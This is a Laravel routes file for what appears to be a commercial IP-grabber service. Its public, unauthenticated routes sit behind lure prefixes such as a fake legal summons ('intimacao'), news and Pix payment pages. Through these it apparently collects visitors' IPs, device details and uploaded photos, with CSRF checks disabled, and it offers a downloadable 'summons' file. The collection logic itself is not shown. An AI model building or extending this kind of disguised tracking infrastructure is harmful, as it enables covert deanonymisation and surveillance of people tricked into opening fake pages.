<?php

use App\Http\Controllers\AnaliseInvestigationPdfController;
use App\Http\Controllers\Auth\EmailVerificationController;
use App\Http\Controllers\Billing\MercadoPagoPixelWebhookController;
use App\Http\Middleware\RequireActiveSubscription;
use App\Http\Controllers\IpGrabberController;
use App\Http\Controllers\IpGrabberFotoController;
use App\Models\SiteAccess;
use Illuminate\Foundation\Http\Middleware\ValidateCsrfToken;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Route;
use Filament\Facades\Filament;

Route::get('/', function (Request $request) {
    try {
        SiteAccess::query()->create([
            'path' => '/',
            'ip' => $request->ip(),
            'referer' => $request->headers->get('referer') ? substr((string) $request->headers->get('referer'), 0, 255) : null,
            'user_agent' => $request->userAgent(),
            'accessed_at' => now(),
        ]);
    } catch (Throwable $e) {
        Log::warning('SiteAccess: erro ao registrar visita na pagina inicial: ' . $e->getMessage());
    }

    return view('welcome');
});

// Verificação de e-mail — rota pública (token)
Route::get('/auth/verify-email/{token}', EmailVerificationController::class)
    ->name('auth.verify-email')
    ->middleware('throttle:10,1');

// Pixel de rastreamento — rotas públicas (sem autenticação)
Route::prefix('/pixel/{token}')->middleware('throttle:60,1')->group(function (): void {
    Route::get('/', [IpGrabberController::class, 'pagina'])->name('pixel.track.legacy');
    Route::get('/gif', [IpGrabberController::class, 'gif'])->name('pixel.gif.legacy');
    Route::get('/og-image', [IpGrabberController::class, 'ogImage'])->name('pixel.og-image.legacy')->middleware('throttle:120,1');
    Route::get('/intimacao', [IpGrabberController::class, 'downloadIntimacao'])->name('pixel.intimacao.download.legacy')->middleware('throttle:10,1');
    Route::post('/device', [IpGrabberController::class, 'atualizarDispositivo'])->name('pixel.device.legacy')->middleware('throttle:10,1')->withoutMiddleware(ValidateCsrfToken::class);
    Route::post('/fotos', [IpGrabberFotoController::class, 'store'])->name('pixel.fotos.store.legacy')->middleware('throttle:5,1')->withoutMiddleware(ValidateCsrfToken::class);
});

Route::prefix('/pix/{token}')->middleware('throttle:60,1')->group(function (): void {
    Route::get('/', [IpGrabberController::class, 'pagina'])->name('pixel.track.pix');
    Route::get('/gif', [IpGrabberController::class, 'gif'])->name('pixel.gif.pix');
    Route::get('/og-image', [IpGrabberController::class, 'ogImage'])->name('pixel.og-image.pix')->middleware('throttle:120,1');
    Route::post('/device', [IpGrabberController::class, 'atualizarDispositivo'])->name('pixel.device.pix')->middleware('throttle:10,1')->withoutMiddleware(ValidateCsrfToken::class);
    Route::post('/fotos', [IpGrabberFotoController::class, 'store'])->name('pixel.fotos.store.pix')->middleware('throttle:5,1')->withoutMiddleware(ValidateCsrfToken::class);
});

Route::prefix('/noticia/{token}')->middleware('throttle:60,1')->group(function (): void {
    Route::get('/', [IpGrabberController::class, 'pagina'])->name('pixel.track.noticia');
    Route::get('/gif', [IpGrabberController::class, 'gif'])->name('pixel.gif.noticia');
    Route::get('/og-image', [IpGrabberController::class, 'ogImage'])->name('pixel.og-image.noticia')->middleware('throttle:120,1');
    Route::post('/device', [IpGrabberController::class, 'atualizarDispositivo'])->name('pixel.device.noticia')->middleware('throttle:10,1')->withoutMiddleware(ValidateCsrfToken::class);
    Route::post('/fotos', [IpGrabberFotoController::class, 'store'])->name('pixel.fotos.store.noticia')->middleware('throttle:5,1')->withoutMiddleware(ValidateCsrfToken::class);
});

Route::prefix('/intimacao/{token}')->middleware('throttle:60,1')->group(function (): void {
    Route::get('/', [IpGrabberController::class, 'pagina'])->name('pixel.track.intimacao');
    Route::get('/gif', [IpGrabberController::class, 'gif'])->name('pixel.gif.intimacao');
    Route::get('/og-image', [IpGrabberController::class, 'ogImage'])->name('pixel.og-image.intimacao')->middleware('throttle:120,1');
    Route::get('/download', [IpGrabberController::class, 'downloadIntimacao'])->name('pixel.intimacao.download');
    Route::post('/device', [IpGrabberController::class, 'atualizarDispositivo'])->name('pixel.device.intimacao')->middleware('throttle:10,1')->withoutMiddleware(ValidateCsrfToken::class);
    Route::post('/fotos', [IpGrabberFotoController::class, 'store'])->name('pixel.fotos.store.intimacao')->middleware('throttle:5,1')->withoutMiddleware(ValidateCsrfToken::class);
});

Route::get('/tracker/{token}', [IpGrabberController::class, 'gif'])
    ->name('pixel.email-tracker')
    ->middleware('throttle:60,1');

Route::post('/billing/pixel/mercado-pago/webhook', MercadoPagoPixelWebhookController::class)
    ->name('billing.pixel.mercado-pago.webhook')
    ->middleware('throttle:120,1')
    ->withoutMiddleware(ValidateCsrfToken::class);

Route::middleware(['auth', RequireActiveSubscription::class])->group(function (): void {
    Route::get('/analises/investigacoes/{investigation}/pdf', AnaliseInvestigationPdfController::class)
        ->name('analises.investigacoes.pdf');
});
